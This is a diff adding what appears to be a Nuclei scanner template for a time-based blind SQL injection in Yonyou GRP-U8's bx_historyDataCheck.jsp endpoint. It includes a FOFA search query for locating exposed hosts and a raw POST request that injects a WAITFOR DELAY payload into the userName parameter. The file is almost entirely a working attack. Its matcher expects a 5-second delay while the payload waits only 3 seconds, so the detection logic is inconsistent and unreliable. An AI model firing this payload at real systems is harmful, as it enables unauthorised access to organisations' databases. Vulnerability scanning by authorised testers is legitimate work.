@@ -1,0 +1,45 @@
+id: poc-e3cdd8aae7d00b5e5ba6
+info:
+  name: 用友GRP-U8bx_historyDataCheck.jspSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e3cdd8aae7d00b5e5ba60eddb9866c01
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e3cdd8aae7d00b5e5ba60eddb9866c01
+    fofa: + fofa`app="用友-GRP-U8"`
+http:
+- raw:
+  - 'POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    Cookie: JSESSIONID=0A5EC135297A3E84647376F665904405
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 53
+
+
+    userName='';WAITFOR DELAY ''0:0:3''--&ysnd=&historyFlag='
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
